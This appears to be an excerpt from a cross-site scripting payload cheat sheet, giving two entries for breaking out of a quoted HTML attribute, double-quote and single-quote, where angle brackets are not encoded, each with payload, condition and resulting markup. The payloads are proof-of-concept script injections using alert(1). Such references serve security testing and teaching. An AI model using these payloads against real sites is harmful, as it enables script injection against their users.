1. XSS inside an Attribute Value inside a Tag without Angle Brackets Encoded (Double Quote)
- Payload: "><script>alert(1)</script>
- Condition: Input is reflected inside an attribute value within an HTML tag where angle brackets (< >) are NOT encoded
- Case: Angle brackets are not filtered so closing the attribute and tag allows injecting a new script tag
- Output: <input type="text" value=""><script>alert(1)</script>">

---

2. XSS inside an Attribute Value inside a Tag without Angle Brackets Encoded (Single Quote)
- Payload: '><script>alert(1)</script>
- Condition: Input is reflected inside an attribute value within an HTML tag where angle brackets (< >) are NOT encoded
- Case: Angle brackets are not filtered so closing the attribute and tag allows injecting a new script tag
- Output: <input type="text" value=''><script>alert(1)</script>'>
